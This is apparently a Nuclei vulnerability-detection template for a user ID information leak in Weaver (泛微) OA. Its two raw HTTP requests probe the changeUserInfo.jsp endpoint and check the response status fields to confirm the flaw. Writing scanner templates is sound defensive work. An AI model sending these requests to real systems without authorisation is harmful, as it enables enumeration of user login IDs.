id: poc-yaml-weaver-changeuserinfo-userid-leak
info:
  name: 泛微OA 用户 id 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 信息泄露
  description: |
    Detects a vulnerability in 泛微OA where user ID information can be leaked.

http:
  - raw:
      - |
        GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "status:\"0\""
        part: body
      - type: word
        words:
          - "<"
        negative: true
        part: body

  - raw:
      - |
        GET /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=09747812138193 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "status:\"-1\""
        part: body
      - type: word
        words:
          - "<"
        negative: true
        part: body
